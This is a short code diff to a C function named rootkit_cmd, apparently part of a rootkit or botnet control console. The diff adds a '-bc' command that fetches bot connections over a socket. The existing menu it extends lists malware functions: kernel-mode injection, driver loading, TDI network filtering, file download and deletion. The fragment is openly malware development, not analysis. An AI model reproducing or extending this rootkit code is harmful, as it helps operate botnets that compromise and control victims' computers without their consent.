@@ -19,6 +19,7 @@ VOID rootkit_cmd(IN SOCKET sock)
 			printf("\r\n[-ku] Download file");
 			printf("\r\n[-sf] Start TDI Filter");
 			printf("\r\n[-st] Stop TDI Filter");
+			printf("\r\n[-bc] Get Bot Connections");
 			printf("\r\n[-ki] Kernel Mode injection");
 			printf("\r\n[-ld] Load driver");
 			printf("\r\n[-fd] Delete file");
@@ -77,6 +78,10 @@ VOID rootkit_cmd(IN SOCKET sock)
 		{
 			rootkit_disconnect_from_driver(sock, ZB_DISCONNECT);
 			goto endconn;
+		}
+		else if (!strcmp(cmd, "-bc"))
+		{
+			rootkit_get_bot_connections(sock, ZB_GET_BOT_CONNECTIONS);
 		}
 		else if (!strcmp(cmd, "-cls"))
 		{
